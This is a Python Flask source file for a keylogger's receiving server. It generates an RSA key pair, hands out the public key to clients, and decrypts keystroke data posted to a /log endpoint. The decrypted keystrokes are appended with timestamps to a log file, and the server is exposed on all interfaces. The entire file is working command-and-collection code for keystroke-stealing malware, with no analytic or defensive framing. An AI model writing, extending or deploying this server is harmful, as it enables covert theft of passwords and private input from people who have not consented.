import os
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
import base64
import datetime

app = Flask(__name__)

# Define absolute paths for all files
BASE_DIR = os.path.expanduser("~/keylogger_server")
KEY_FILE = os.path.join(BASE_DIR, "private_key.pem")
PUBLIC_KEY_FILE = os.path.join(BASE_DIR, "public_key.pem")
LOG_FILE = os.path.join(BASE_DIR, "keystroke_log.txt")

# Create directory if it doesn't exist
os.makedirs(BASE_DIR, exist_ok=True)

print(f"Server starting. Files will be stored in: {BASE_DIR}")
print(f"Log file will be at: {LOG_FILE}")

if not os.path.exists(KEY_FILE):
    # Generate new key pair
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    # Save private key
    with open(KEY_FILE, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    
    # Save public key
    public_key = private_key.public_key()
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
else:
    # Load existing key
    with open(KEY_FILE, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None
        )

# Function to decrypt data with private key
def decrypt_data(encrypted_data):
    encrypted_bytes = base64.b64decode(encrypted_data)
    decrypted_bytes = private_key.decrypt(
        encrypted_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted_bytes.decode('utf-8')

# API endpoint to receive keystrokes
@app.route('/log', methods=['POST'])
def log_keystroke():
    if not request.is_json:
        return jsonify({"error": "Invalid request format"}), 400
    
    data = request.json
    encrypted_keystrokes = data.get('data')
    
    if not encrypted_keystrokes:
        return jsonify({"error": "No data provided"}), 400
    
    try:
        decrypted_keystrokes = decrypt_data(encrypted_keystrokes)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Save to logfile with full path
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] {decrypted_keystrokes}\n")
        
        print(f"Logged keystrokes at {timestamp}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error logging keystrokes: {str(e)}")
        return jsonify({"error": str(e)}), 500

# Endpoint to get the public key
@app.route('/public_key', methods=['GET'])
def get_public_key():
    try:
        with open(PUBLIC_KEY_FILE, "rb") as key_file:
            public_key_pem = key_file.read()
        print("Public key requested and sent successfully")
        return public_key_pem
    except Exception as e:
        print(f"Error serving public key: {str(e)}")
        return str(e), 500

# Simple endpoint to check if server is running
@app.route('/', methods=['GET'])
def home():
    return "Keylogger server is running"

if __name__ == "__main__":
    # Run on all interfaces, port 5000
    print("Starting server on port 5000...")
    app.run(host='0.0.0.0', port=5000, debug=False)
